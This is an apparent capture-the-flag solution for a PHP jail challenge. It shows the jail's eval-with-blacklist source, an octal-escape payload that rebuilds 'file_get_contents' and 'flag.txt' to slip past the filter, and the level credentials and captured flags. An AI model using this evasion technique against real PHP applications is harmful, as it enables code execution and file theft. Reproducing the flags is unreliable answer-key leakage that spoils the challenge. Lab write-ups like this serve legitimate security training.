ssh level2@challenges.ringzer0ctf.com -p 10224

Mot de passe: FLAG-sW66QEY4y6724723c7w1i0oMt179E75y

```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>
```

$g="\\146\\151\\154\\145\\137\\147\\145\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163"; $x=$g("\\146\\154\\141\\147\\056\\164\\170\\164"); print $x;

FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL